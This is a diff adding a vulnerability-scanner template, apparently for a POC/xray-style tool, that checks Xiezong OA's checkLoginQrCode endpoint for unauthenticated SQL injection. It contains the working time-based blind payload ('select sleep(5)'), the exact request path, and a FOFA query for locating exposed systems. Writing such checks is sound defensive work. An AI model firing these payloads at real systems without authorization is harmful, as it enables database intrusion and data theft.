@@ -1,0 +1,49 @@
+id: xiezong-oa-checkLoginQrCode-sqli
+info:
+  name: Xiezong OA checkLoginQrCode SQL Injection
+  author: ZacharyZcR
+  severity: critical
+  description: |
+    Xiezong OA system has a SQL injection vulnerability in the checkLoginQrCode interface.
+    Unauthenticated attackers can exploit this vulnerability to extract information from the database.
+    FOFA: app="协众软件-协众OA"
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%8D%8F%E4%BC%97OA/%E5%8D%8F%E4%BC%97OA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3checkLoginQrCode%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.md
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /index.php?app=main&func=common&action=commonJob&act=checkLoginQrCode
+      headers:
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Priority: u=0, i
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+      body: id=1
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'failure') &&
+      response.headers["Content-Type"].contains("text/html")
+    stop_if_mismatch: true
+
+  r1:
+    before_sleep: 2
+    request:
+      method: POST
+      path: /index.php?app=main&func=common&action=commonJob&act=checkLoginQrCode
+      headers:
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Priority: u=0, i
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+      body: id=(select * from (select sleep(5))z)
+    expression: response.status == 200 && response.latency >= 5
+
+expression: r0() && r1()
